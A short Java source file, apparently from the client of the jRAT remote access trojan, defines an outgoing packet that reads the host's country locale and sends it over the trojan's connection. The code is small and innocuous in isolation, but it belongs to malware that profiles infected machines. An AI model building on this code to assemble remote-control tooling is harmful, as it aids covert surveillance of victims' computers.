package jrat.client.packets.outgoing;

import jrat.client.Connection;


public class Packet8InitCountry implements OutgoingPacket {

	@Override
	public void write(Connection con) throws Exception {
		con.writeLine(System.getProperty("user.country"));
	}

	@Override
	public short getPacketId() {
		return (byte) 8;
	}
}